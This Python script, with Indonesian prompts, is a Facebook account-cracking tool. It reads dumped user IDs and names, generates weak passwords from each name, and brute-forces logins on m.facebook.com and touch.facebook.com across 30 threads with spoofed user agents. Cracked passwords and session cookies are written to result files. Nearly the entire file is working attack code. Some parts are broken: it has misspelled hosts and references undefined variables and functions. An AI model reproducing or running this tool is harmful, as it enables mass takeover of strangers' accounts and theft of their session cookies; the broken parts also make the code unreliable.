import requests,bs4,json,os,sys,random,datetime,time,re,subprocess
from bs4 import BeautifulSoup as sop
from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn
from rich.progress import SpinnerColumn
from concurrent.futures import ThreadPoolExecutor as tred

P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'

dump=[]
cokbrut=[]
ses=requests.Session()

id,id2,loop,ok,cp,akun,oprek,method,uid= [],[],0,0,0,[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]

dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

def uk():
	rr = random.randint
	a1 = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	a2 =random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	pub = random.choice(["PDHM00","PBBM00","PENM00","PEFM00","PBCM10","PFZM10","PGZ110","PBCM10","PEUM00","PEGM10","OPPO A59s","PENM00","PDBM00"])
	ua = f"Mozilla/5.0 (Linux; U; Android {str(rr(8,12))}; in-id; PEUM00 Build/RKQ1.21{str(rr(0,9))}{str(rr(0,9))}{str(rr(0,9))}{str(rr(0,9))}9.001){a1}{str(rr(100,900))}{a2}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.{str(rr(61100,61190))}.0.{str(rr(4300,4900))}.{str(rr(20,150))} Mobile Safari/537.36 HeyTapBrowser/40.8.8.1"
	return ua

redmi = []
kontol = []
sagne = []
for x in range(1110):
        rr = random.randint
        rc = random.choice
        A = f'Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.'
        B = f'{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 '
        C = f'(KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari'
        D = f'/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP'
        se = f'{A}{B}{C}{D}'
        if se in redmi:pass
        else:redmi.append(se)

def xnfile():
	try:_luxine = os.listdir('RKING')
	except FileNotFoundError:
		print(' Helo Word Harap Buat File Terlebih Dahulu Nama Kan File itu RKING dan isi dalam nya pake file dump kamu jika tidak tau silakan chet wahtsap admin terimakasih><')
		time.sleep(2)
		back()
	if len(_luxine)==0:
		print('Maaf Sebelumnya Buat File Dump Id mu Terlebih Dahulu Dan Pindahkan File Dump Id itu Ke /sdcard/RKING Lalu Jalankan ulang script ini thanks')
		time.sleep(2)
		back()
	else:
		_meledak_ = 0
		_doar_ = {}
		for isi in _luxine:
			try:hem = open('RKING/'+isi,'r').readlines()
			except:continue
			_meledak_+=1
			if _meledak_<100:
				nom = ''+str(_meledak_)
				_doar_.update({str(_meledak_):str(isi)})
				_doar_.update({nom:str(isi)})
				print(f'[{nom}] {isi} total id {len(hem)}')
			else:
				_doar_.update({str(cih):str(isi)})
		geeh = input(f'[*] pilih nomor file : ')
		try:geh = _doar_[geeh]
		except KeyError:
			time.sleep(3)
			back()
		try:lin = open('RKING/'+geh,'r').read().splitlines()
		except:
			print('File Tidak Ada Maad')
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		setting()
		
def setting():
	print('')
	print(f"[01] tahun tua")
	print(f"[02] tahun muda")
	print(f"[03] tahun random")
	hu = input(f"[*] pilih tahun akun : ")
	if hu in ['1','old']:
		for tua in sorted(id):
			id2.append(tua)
			
	elif hu in ['2','new']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','random']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('╰─ input correctly ')
		exit()
		print('')
		
	print("")
	print(f"[01] m.facebook.com")
	print(f"[02] touch.facebook.com")
	print(f"[03] free.facebook.com")
	hc = input(f"[*] pilih metode login : ")
	if hc in ['1','01']:
		method.append('mobile')
	if hc in ['2','02']:
		method.append('mbasic')
	else:
		method.append('mobile')
	su() 
def su():
	print("")
	print(f"[01] sandi otomatis")
	print(f"[02] sandi gabung")
	print(f"[03] sandi manual")
	ch = input(f'[*] pilih sandi login : ')
	if ch in ['1','01']:
		passu()
	else:
		passu()
def passu():
	global prog,des
	print('') 
	prog = Progress(TextColumn('{task.description}'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				if 'mbasic' in method:
					pool.submit(naon,idf,pwv)
				else:
					pool.submit(crack,idf,pwv)
		print(f"• crack selesai")
		
def crack(idf,pwv):
	global loop,ok,cp
	
	ses = requests.Session()
	ua = random.choice(redmi)
	ua2 = random.choice(redmi)
	for pw in pwv:
		try:
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.faceboom.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fm.faceboom.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc5ab7d53-0810-47b0-8640-39adfbf98cfd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://m.faceboom.com/tools/debug/accesstoken/"}
			ses.headers.update({"Host":'m.faceboom.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.faceboom.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				#tree=Tree(f"")
				#tree.add(f"{cpc}").add(f"\r{idf}|{pw}")
				#tree.add(f"{ua}")
				#rprint(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif twf in ses.cookies.get_dict().keys():
				print(f'[A2F] {idf}|{pw}')
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki = (";").join([ "%s=%s" % (key, value) for key, value in sess.cookies.get_dict().items() ])
				tree=Tree(f"")
				tree.add(f"{okc}")
				tree.add(f"\r{idf}|{pw}").add(f"{coki}")
				tree.add(f"{ua2}")
				rprint(tree)
					#print(f'[CK]{coki}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				open('Facebook/'+okc,'a').write('Facebook.com/'+idf+'|'+pw+'\n')
				break
			else:
				continue
		#except Exception as e:print(e)
		except requests.exceptions.ConnectionError:
			time.sleep(30)
	loop+=1

def naon(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'[*] {(loop)}/{len(id)} OK : {(ok)} CP : {(cp)}')
	prog.advance(des)
	ses = requests.Session()
	ua = random.choice(redmi)
	ua2 = random.choice(redmi)
	for pw in pwv:
		try:
			ses.headers.update({"Host":'touch.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://touch.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://touch.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Ftouch.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc5ab7d53-0810-47b0-8640-39adfbf98cfd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://touch.facebook.com/tools/debug/accesstoken/"}
			ses.headers.update({"Host":'touch.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://touch.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://touch.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
			po = ses.post('https://touch.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f"\r*---> {idf}|{pw}{P}")
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f"\r{H}*---> {idf}|{pw}\n{kuki}{P}")
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				open('Facebook/'+okc,'a').write('Facebook.com/'+idf+'|'+pw+'\n')
				break
			else:
				continue
		#except Exception as e:print(e)
		except requests.exceptions.ConnectionError:
			time.sleep(30)
	loop+=1
	
if __name__=='__main__':
	xnfile()


